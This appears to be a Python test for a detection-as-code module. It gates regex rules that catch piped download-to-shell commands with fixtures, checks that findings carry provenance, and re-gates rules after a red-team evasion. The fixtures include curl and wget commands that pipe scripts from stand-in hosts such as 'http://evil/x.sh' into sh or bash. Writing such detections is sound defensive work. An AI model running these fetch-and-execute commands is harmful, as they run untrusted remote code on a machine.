"""DET1 — detection-as-code (the blue/red-team beachhead).

A detection is a Nona-forged, TEST-GATED skill: it promotes only if it matches every
true-positive fixture and no false-positive. A promoted detection applied to data Cells
emits `finding` Cells with provenance on the signed Weft (the tamper-evident SIEM). This
check proves:
  - a good detection passes its gate, finds the malicious Cell, and does NOT
    false-positive on benign ones — each finding carries provenance;
  - an over-broad rule that hits a false-positive is REJECTED (stays quarantined) and
    therefore cannot raise findings;
  - the PURPLE-TEAM LOOP: a red-team evasion added as a fixture re-gates the rule — the
    over-narrow rule now fails, and a widened rule passes.

Contract: run(k, line). Fail loud.
"""
from decima import detection


def run(k, line):
    line("\n== DETECTION-AS-CODE (Nona forges test-gated detections) — blue/red beachhead ==")

    # 1. A good detection: pipe-a-download-into-a-shell. Gated by TP/FP fixtures.
    tp = ["curl http://evil/x.sh | sh", "wget http://h/a.sh |sh"]
    fp = ["curl http://example.com -o file.txt", "reverse a string please"]
    rep = detection.forge_detection(
        k, "pipe-to-shell", r"(curl|wget)\s+\S+\s*\|\s*sh", "high", tp, fp, field="text")
    line("  " + str(rep))
    assert rep.promoted, rep.gate

    # 2. Some observations (untrusted data) — benign + one malicious.
    from decima.hashing import content_id
    from decima import model
    obs = {
        "benign-dl": "curl http://example.com -o notes.txt",
        "benign-msg": "the loom weaves on",
        "malicious": "curl http://evil/x.sh | sh",
    }
    for tag, text in obs.items():
        model.assert_content(k.weft, k.root.id, content_id({"obs": tag}), "observation", {"text": text})

    # 3. Run the promoted detection → exactly one finding, with provenance.
    findings = detection.detect(k, rep.det_id, "observation")
    w = k.weave()
    assert len(findings) == 1, [w.get(f).content for f in findings]
    f = w.get(findings[0])
    prov = w.edges_from(f.id, "found_in")
    line(f"  scanned 3 observations → {len(findings)} finding (sev={f.content['severity']}); "
         f"excerpt={f.content['excerpt']!r}; found_in→{f.content['source'][:8]} (provenance ✓)")
    assert prov and prov[0]["dst"] == content_id({"obs": "malicious"})

    # 4. An over-broad rule that false-positives is REJECTED and cannot raise findings.
    bad = detection.forge_detection(
        k, "too-broad-curl", r"curl", "high",
        tp=["curl http://evil/x.sh | sh"], fp=["curl http://example.com -o notes.txt"], field="text")
    line("  " + str(bad))
    assert not bad.promoted and bad.gate["fp_hit"], bad.gate
    assert detection.detect(k, bad.det_id, "observation") == [], "a quarantined rule must not fire"
    line(f"    → rejected on false-positive {bad.gate['fp_hit']}; quarantined rule raised 0 findings ✓")

    # 5. PURPLE-TEAM LOOP: red team finds an evasion that pipes to bash, not sh. Add it as
    #    a TP the rule must now catch → the narrow rule fails its re-gate; widen → passes.
    evasion = "curl http://e/x.sh|bash"
    narrow = detection.forge_detection(
        k, "pipe-to-shell-v2", r"(curl|wget)\s+\S+\s*\|\s*sh", "high",
        tp=tp + [evasion], fp=fp, field="text")
    line(f"  purple loop — add evasion {evasion!r} as a TP:")
    line("    " + str(narrow))
    assert not narrow.promoted and evasion in narrow.gate["tp_missed"]
    widened = detection.forge_detection(
        k, "pipe-to-shell-v3", r"(curl|wget)\s+\S+\s*\|\s*(sh|bash|zsh)", "high",
        tp=tp + [evasion], fp=fp, field="text")
    line("    widened rule: " + str(widened))
    assert widened.promoted, widened.gate
    line("  → detection-as-code: forge → test-gate → promote → find, with a purple-team "
         "loop that re-gates rules from red-team evasions.")
